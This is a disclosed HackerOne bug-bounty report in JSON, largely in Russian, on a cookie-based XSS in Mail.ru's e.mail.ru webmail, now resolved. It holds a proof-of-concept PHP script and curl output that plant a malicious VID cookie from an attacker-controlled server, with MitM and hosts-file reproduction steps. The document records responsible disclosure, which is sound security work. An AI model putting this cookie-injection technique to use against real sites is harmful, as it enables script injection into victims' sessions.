{"id":312548,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTI1NDg=","url":"https://hackerone.com/reports/312548","title":"XSS via Cookie in e.mail.ru","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-02-05T15:27:29.228Z","submitted_at":"2018-02-05T15:27:29.228Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"obmi","url":"/obmi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-15T17:04:51.999Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-07-16T17:04:40.884Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Привет! Нашел stored xss через куку VID. Обычно такое эксплуатируется через mitm.\nСама кука не имеет атрибутов secure и samesite, что дает возможность выставить ее по http на сервере атакующего.\n\n\nСценарий такой:\n1. Жертва находится в сети атакующего\n2. DNS сервер сети атакующего резолвит хост attacker.mail.ru на его сервер\n3. Жертва идет на attacker.mail.ru (или атакующий ее автоматически редиректит на него)\n4. Сервер attacker.mail.ru перезаписывает куку VID\n5. Жертва получает stored xss на e.mail.ru\n\n\nСкриншоты:\n\n{F260393}\n{F260394}\n\n\n\nПоднял виртуальный хост, который вешает куку тут:\n\n```\nmihailob@kali:~/tmp$ curl -i 'http://52.34.103.214/' -H 'Host: attacker.mail.ru'\nHTTP/1.1 200 OK\nServer: nginx/1.13.8\nDate: Mon, 05 Feb 2018 15:21:20 GMT\nContent-Type: text/html\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/5.5.9-1ubuntu4.22\nSet-Cookie: VID='+alert(123123123)+'; expires=Tue, 06-Feb-2018 01:21:20 GMT; Max-Age=36000; path=/; domain=.mail.ru; httponly\nAccess-Control-Allow-Origin: *\n\n\n\u003chtml\u003e\n\u003chead\u003e\n\n\u003c/head\u003e\n\u003c/html\u003e\n```\n\n\n\nЛистиг скрипта, который вешает куку:\n\n```\ncat index.php \n\u003c?php\n\nif ($_SERVER['HTTP_HOST'] == 'attacker.mail.ru') {\n        setrawcookie(\"VID\",'\\'+alert(123123123)+\\'', time()+36000, \"/\", \".mail.ru\",0,1);\n}\n\n?\u003e\n\n\u003chtml\u003e\n\u003chead\u003e\n\n\u003c/head\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nxss","bounty_amount":"350.0","formatted_bounty":"$350","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":260393,"file_name":"screen_006.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/260/393/0908a0820c8af31023957b870958a46fc5c934a2/screen_006.png?response-content-disposition=attachment%3B%20filename%3D%22screen_006.png%22%3B%20filename%2A%3DUTF-8%27%27screen_006.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQX46P3UGI%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144332Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIGvlFSN4tPhAu4V7v5pc7%2F6eSiik7IhHLLD01kiqhVWYAiB5Dz9ea%2BLZD%2BpLtagj4O%2BjrW%2FPBVXyOw%2FvfPhYOWnLJyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMy2N4EHiSo%2FA9G2F0KtcDeo3CuylmH%2BuFka3rGPAArFX7PEojyq8EAAWPijF4XtZGXNXpmeQR1pzTOcI0Rm%2Fvja%2BwHd%2F8TxJsGVWeh%2Flk5vjiIRZT9GPW9u3ZycCrjqMci9iGhBM6uwkYQOmABA3poTj0CyTV9vU5PwMEPHFcEacwKutRiCveofJe7f8Tu4WHR%2BNU7KEmxqtXpvAXj8hQLxFVDU25WgaPgk2b4mSQSaY%2FPywLP4TuBkCMbSNVoBG2JTX5CaBeJN5iElkzZ62K%2FGVGXrbaaNyPhn%2BB8rXIjbw78eQJEkHjvT8OqfCHAYP5f%2B4IhYfTll35nE7LIUoMiLvBq6tkN5BWqoopu%2Fpju60lSqB656qlcZeAK9f5orDqJzDwlKMnoVzqvkUrUy9bmk%2BkxGW97VVmeHZ1t0v3wof%2BrT0QSrWeBO35JesCQ%2BdFE8O%2BxosSdP7tU4A%2BDPpxwomZQHAAcNR9Aywt%2FQ8Qbv894mkGzt9WDwY%2FFN8jeU3O6C%2BmyqjrgMf7nGycFeD87%2Bsgs8CikLj6%2BhBYFpskae2EppYXvqHFDwWaJKFLdI8X3NNsrRpCnIXL5GUe8p%2BBySjVvE4SnyaxoJD5sUMGcJj0QQyQGgO22eUI1ATV1DsO%2BN%2BaLLxtMPqIkYsGOqYBTa91vvmG%2BK28LWqLSYG8vhMxYQ%2Fxj6PD70iq5MyM9pLPu1bgCyqJfX2mwm9fHA6UDqgGoerI%2Bnp3Q6V4OYY0E3hEAx7T8Q%2FppO8G%2BTgH7gaNlLC%2Fng4%2BkFoIuXyVGb7q1PCueRn4pqAqwTocflxXYcQQGudKiKkzrNHGy4UeULO76lDgSIcMEtI1vIJ76b2MxFEJwq4lWhln09Xn3ksb8maUXRDeCg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0192d6a3cfb5312283d6a12b59fa431bab746bd780dce321c5394f9cd629ce57","file_size":16116,"type":"image/png"},{"id":260394,"file_name":"screen_005.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/260/394/1f333725bf445b6eef3cba97bedbecf4eb0f3bb6/screen_005.png?response-content-disposition=attachment%3B%20filename%3D%22screen_005.png%22%3B%20filename%2A%3DUTF-8%27%27screen_005.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQX46P3UGI%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144332Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIGvlFSN4tPhAu4V7v5pc7%2F6eSiik7IhHLLD01kiqhVWYAiB5Dz9ea%2BLZD%2BpLtagj4O%2BjrW%2FPBVXyOw%2FvfPhYOWnLJyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMy2N4EHiSo%2FA9G2F0KtcDeo3CuylmH%2BuFka3rGPAArFX7PEojyq8EAAWPijF4XtZGXNXpmeQR1pzTOcI0Rm%2Fvja%2BwHd%2F8TxJsGVWeh%2Flk5vjiIRZT9GPW9u3ZycCrjqMci9iGhBM6uwkYQOmABA3poTj0CyTV9vU5PwMEPHFcEacwKutRiCveofJe7f8Tu4WHR%2BNU7KEmxqtXpvAXj8hQLxFVDU25WgaPgk2b4mSQSaY%2FPywLP4TuBkCMbSNVoBG2JTX5CaBeJN5iElkzZ62K%2FGVGXrbaaNyPhn%2BB8rXIjbw78eQJEkHjvT8OqfCHAYP5f%2B4IhYfTll35nE7LIUoMiLvBq6tkN5BWqoopu%2Fpju60lSqB656qlcZeAK9f5orDqJzDwlKMnoVzqvkUrUy9bmk%2BkxGW97VVmeHZ1t0v3wof%2BrT0QSrWeBO35JesCQ%2BdFE8O%2BxosSdP7tU4A%2BDPpxwomZQHAAcNR9Aywt%2FQ8Qbv894mkGzt9WDwY%2FFN8jeU3O6C%2BmyqjrgMf7nGycFeD87%2Bsgs8CikLj6%2BhBYFpskae2EppYXvqHFDwWaJKFLdI8X3NNsrRpCnIXL5GUe8p%2BBySjVvE4SnyaxoJD5sUMGcJj0QQyQGgO22eUI1ATV1DsO%2BN%2BaLLxtMPqIkYsGOqYBTa91vvmG%2BK28LWqLSYG8vhMxYQ%2Fxj6PD70iq5MyM9pLPu1bgCyqJfX2mwm9fHA6UDqgGoerI%2Bnp3Q6V4OYY0E3hEAx7T8Q%2FppO8G%2BTgH7gaNlLC%2Fng4%2BkFoIuXyVGb7q1PCueRn4pqAqwTocflxXYcQQGudKiKkzrNHGy4UeULO76lDgSIcMEtI1vIJ76b2MxFEJwq4lWhln09Xn3ksb8maUXRDeCg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=974d23fad1027fddf9f32d9c9436b785d1b1d04e60115d069c6ff576e54b047a","file_size":117437,"type":"image/png"}],"allow_singular_disclosure_at":"2018-08-15T17:04:41.013Z","allow_singular_disclosure_after":-99610731.91176842,"singular_disclosure_allowed":true,"vote_count":7,"voters":["maxarr","ali","ms-13","eveeez","its_afolic","mefkan","cryptographer"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":245,"asset_type":"URL","asset_identifier":"e.mail.ru","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2352493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Чтобы проверить в браузере без заморочек с dns'ами - можно сделать так:\n1. Авторизоваться в почте на https://e.mail.ru/\n2. Добавить в /etc/hosts запись: 52.34.103.214 attacker.mail.ru\n3. Открыть http://attacker.mail.ru/ (я добавил там сразу редирект в почту)","automated_response":false,"created_at":"2018-02-05T15:40:02.792Z","updated_at":"2018-02-05T15:40:02.792Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2352498,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.","automated_response":false,"created_at":"2018-02-05T15:42:43.671Z","updated_at":"2018-02-05T15:42:43.671Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2359006,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Привет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице https://hackerone.com/settings/bounties можно выбрать желаемый метод выплаты. \n\nСпасибо и ждем от тебя новых багрепортов!\n\nP.S. работа по устранению уязвимости пока продолжается.","automated_response":false,"created_at":"2018-02-07T15:25:25.290Z","updated_at":"2018-02-07T15:25:25.290Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"bounty_amount":"350.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"mailru","collaborator":{"username":"obmi","url":"/obmi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2359113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Спасибо!!! А почему 350? Из-за эксплуатации через mitm? Если да, то в след я постараюсь найти возможность выполнить атаку без mitm, если это так влияет на баунти (то же самое должно работать через xss или инъекцию в хидер ответа на любом поддомене mail.ru )","automated_response":false,"created_at":"2018-02-07T15:54:03.268Z","updated_at":"2018-02-07T15:54:03.268Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2383087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Такая цена обусловлена тем, что для эксплуатации данной уязвимости необходим mitm, либо требуется наличие дополнительной уязвимости (CRLF Injection или Cookie Injection), что несколько снижает её критичность","automated_response":false,"created_at":"2018-02-14T16:26:54.388Z","updated_at":"2018-02-14T16:26:54.388Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2647284,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет, бага закрыта.\nПожалуйста, подтвердите, что проблема больше не воспроизводится. \n","automated_response":false,"created_at":"2018-04-20T15:10:47.798Z","updated_at":"2018-04-20T15:10:47.798Z","actor":{"username":"yngwie","cleared":false,"url":"/yngwie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/185/1b6bf6046f42c100e3793d87a8410bc07178fa8f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"obmi","url":"/obmi"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2647883,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет, подтверждаю, починено","automated_response":false,"created_at":"2018-04-20T17:06:29.744Z","updated_at":"2018-04-20T17:06:29.744Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3052730,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2018-07-16T16:59:56.330Z","updated_at":"2018-07-16T16:59:56.330Z","additional_data":{"added_weaknesses":[{"id":63,"name":"Cross-site Scripting (XSS) - DOM"}],"removed_weaknesses":[{"id":62,"name":"Cross-site Scripting (XSS) - Stored"}]},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3052750,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-07-16T17:04:40.936Z","updated_at":"2018-07-16T17:04:40.936Z","first_to_agree":true,"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3200071,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-08-15T17:04:52.030Z","updated_at":"2018-08-15T17:04:52.030Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":9576,"category":"team","content":"Cookie-based XSS via VID cookie.\nSeverity was considered as medium due to fact VID cookie is HTTP only, MitM or another specific conditions are required to exploit it.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":4836,"username":"3apa3a","name":"Vladimir Dubrovin","bio":"En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ","cleared":false,"website":"https://3proxy.org/","location":"Nizhny Novgorod, Russia","created_at":"2014-04-10T22:08:47.745Z","url":"https://hackerone.com/3apa3a","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}